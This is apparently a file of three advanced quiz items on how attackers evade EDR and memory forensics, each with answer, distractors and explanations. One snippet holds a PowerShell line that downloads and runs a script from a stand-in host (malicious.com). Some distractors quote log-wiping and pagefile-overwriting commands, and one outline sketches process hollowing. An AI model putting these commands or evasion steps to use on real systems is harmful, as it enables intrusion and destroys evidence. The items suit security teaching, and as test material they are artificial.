@@ -1,0 +1,115 @@
+[
+  {
+    "question_text": "To defeat the detection capabilities of Endpoint Detection and Response (EDR) solutions, an attacker would likely employ which anti-forensics technique?",
+    "correct_answer": "Use in-memory execution and direct system calls to avoid writing to disk and bypassing API hooks",
+    "distractors": [
+      {
+        "question_text": "Encrypt all network traffic with a custom protocol to prevent EDR network analysis",
+        "misconception": "Targets scope misunderstanding: Student confuses network-level encryption with endpoint process-level evasion. EDR primarily focuses on endpoint activity, not just network traffic content."
+      },
+      {
+        "question_text": "Disable Windows Event Logging services to prevent EDR from collecting system events",
+        "misconception": "Targets artifact type confusion: Student confuses general system logging with EDR&#39;s specific telemetry collection, which often uses kernel-level hooks or proprietary agents independent of standard Windows Event Logs."
+      },
+      {
+        "question_text": "Modify the system&#39;s date and time to confuse EDR&#39;s timeline analysis",
+        "misconception": "Targets effectiveness over scope: Student believes simple time manipulation would defeat EDR, but EDR correlates events across multiple sources and often uses internal timestamps, making this less effective for evasion."
+      }
+    ],
+    "detailed_explanation": {
+      "core_logic": "EDR solutions monitor endpoint memory, file system, and network activity. By executing malicious code directly in memory (fileless malware) and using direct system calls (syscalls) instead of high-level API calls, attackers can bypass EDR&#39;s API hooks and avoid leaving forensic artifacts on disk that EDR agents would detect.",
+      "distractor_analysis": "While encrypting network traffic can hinder network-based detection, EDR&#39;s primary focus is on endpoint behavior, which would still be visible. Disabling Windows Event Logging might remove some data, but EDR agents often collect telemetry through their own kernel-level drivers, independent of standard Windows logs. Modifying system time is a timestomping technique, but EDR&#39;s advanced correlation and internal timestamping mechanisms would likely still detect anomalous activity, even if the system clock is altered.",
+      "analogy": "Like a burglar who enters a building through a hidden tunnel and avoids all motion sensors and cameras, rather than just trying to obscure their face."
+    },
+    "code_snippets": [
+      {
+        "language": "powershell",
+        "code": "IEX (New-Object Net.WebClient).DownloadString(&#39;http://malicious.com/payload.ps1&#39;)",
+        "context": "Example of in-memory execution using PowerShell to download and execute a script without writing it to disk."
+      },
+      {
+        "language": "c",
+        "code": "// Example of direct syscall in C (simplified)\nNTSTATUS status = NtCreateThreadEx(...);",
+        "context": "Illustrates the concept of direct system calls to bypass user-mode API hooks, often used in advanced evasion."
+      }
+    ],
+    "difficulty": "advanced",
+    "question_type": "attack",
+    "prerequisites": [
+      "EDR_CONCEPTS",
+      "MEMORY_FORENSICS",
+      "FILELESS_MALWARE",
+      "WINDOWS_API_HOOKING"
+    ]
+  },
+  {
+    "question_text": "To cover tracks after deploying a sophisticated AI-powered malware that leverages LLMs for dynamic evasion, a threat actor would likely prioritize which anti-forensics technique?",
+    "correct_answer": "Employing polymorphic code generation and dynamic obfuscation to alter malware signatures and evade static analysis",
+    "distractors": [
+      {
+        "question_text": "Deleting all system logs using `wevtutil cl` and `rm -rf /var/log/*`",
+        "misconception": "Targets scope misunderstanding: While log deletion is common, AI-powered malware&#39;s primary evasion is often signature-based, and log deletion is a secondary cleanup. This distractor focuses on a general cleanup rather than specific AI-malware evasion."
+      },
+      {
+        "question_text": "Timestomping the malware executable to match legitimate system file creation dates",
+        "misconception": "Targets effectiveness misunderstanding: Timestomping helps with blending in but is less effective against behavioral analysis or dynamic signature detection, which AI-powered malware would specifically try to evade."
+      },
+      {
+        "question_text": "Encrypting the entire hard drive to prevent data recovery and forensic imaging",
+        "misconception": "Targets operational impact: Encrypting the entire drive would render the system unusable or immediately suspicious, which is counterproductive for a sophisticated, stealthy AI-powered malware aiming for persistence."
+      }
+    ],
+    "detailed_explanation": {
+      "core_logic": "Sophisticated AI-powered malware, especially those leveraging LLMs for dynamic evasion, would focus on anti-forensics techniques that make their code difficult to detect and analyze. Polymorphic code generation and dynamic obfuscation continuously change the malware&#39;s signature and behavior, making it challenging for traditional antivirus and static analysis tools to identify. This directly counters detection mechanisms that rely on known patterns.",
+      "distractor_analysis": "Deleting logs is a general cleanup step but doesn&#39;t directly address the evasion of the malware&#39;s core functionality. Timestomping helps with initial stealth but doesn&#39;t prevent detection once the malware is executing and exhibiting malicious behavior. Encrypting the entire hard drive is a highly destructive act that would immediately alert defenders and prevent the malware from achieving its objectives, making it an unlikely primary anti-forensics technique for stealthy, persistent threats.",
+      "analogy": "Imagine a chameleon that can not only change its color but also its shape and movement patterns to avoid detection, rather than just hiding in a bush."
+    },
+    "code_snippets": [],
+    "difficulty": "advanced",
+    "question_type": "attack",
+    "prerequisites": [
+      "MALWARE_ANALYSIS",
+      "ANTI_FORENSICS_BASICS",
+      "AI_IN_CYBERSECURITY",
+      "CODE_OBFUSCATION"
+    ]
+  },
+  {
+    "question_text": "To defeat memory forensics analysis that relies on scanning for malicious code in process memory, an advanced attacker would:",
+    "correct_answer": "Employ process hollowing or process doppelganging to execute malicious code within a legitimate process&#39;s memory space",
+    "distractors": [
+      {
+        "question_text": "Encrypt the entire hard drive to prevent memory dump analysis",
+        "misconception": "Targets volatility confusion: Student confuses disk encryption with protecting live RAM, which is volatile and separate from the hard drive."
+      },
+      {
+        "question_text": "Clear the browser history and cache to remove execution artifacts",
+        "misconception": "Targets scope misunderstanding: Student confuses web browser artifacts (disk-based) with volatile memory evidence."
+      },
+      {
+        "question_text": "Use `cipher /w` on the `pagefile.sys` to overwrite its contents",
+        "misconception": "Targets volatility confusion: Student confuses the disk-based swap file (`pagefile.sys`) with live RAM, and a disk wiping tool with memory manipulation."
+      }
+    ],
+    "detailed_explanation": {
+      "core_logic": "Process hollowing and doppelganging are advanced techniques where an attacker creates a legitimate suspended process, unmaps its original memory, and injects malicious code into its address space. This allows the malicious code to run under the guise of a trusted process, making it harder for memory scanners to detect based on process name or typical memory patterns.",
+      "distractor_analysis": "Encrypting the hard drive prevents disk forensics but has no direct impact on live memory analysis. Clearing browser history and cache removes disk-based web artifacts, not volatile memory evidence. Using `cipher /w` on `pagefile.sys` targets the swap file on disk, not the live RAM being analyzed by memory forensics tools.",
+      "analogy": "Like a spy replacing the contents of a legitimate document with secret instructions, making it appear to be an ordinary memo while carrying out covert operations."
+    },
+    "code_snippets": [
+      {
+        "language": "c",
+        "code": "// Simplified Process Hollowing Steps:\n// 1. Create a legitimate process in a suspended state.\n// 2. Unmap the legitimate process&#39;s memory sections.\n// 3. Allocate new memory in the legitimate process.\n// 4. Write malicious code into the newly allocated memory.\n// 5. Set the process&#39;s entry point to the malicious code.\n// 6. Resume the thread.",
+        "context": "Conceptual steps for process hollowing, a common memory evasion technique."
+      }
+    ],
+    "difficulty": "advanced",
+    "question_type": "attack",
+    "prerequisites": [
+      "MEMORY_FORENSICS",
+      "WINDOWS_INTERNALS",
+      "PROCESS_INJECTION",
+      "ROOTKITS"
+    ]
+  }
+]
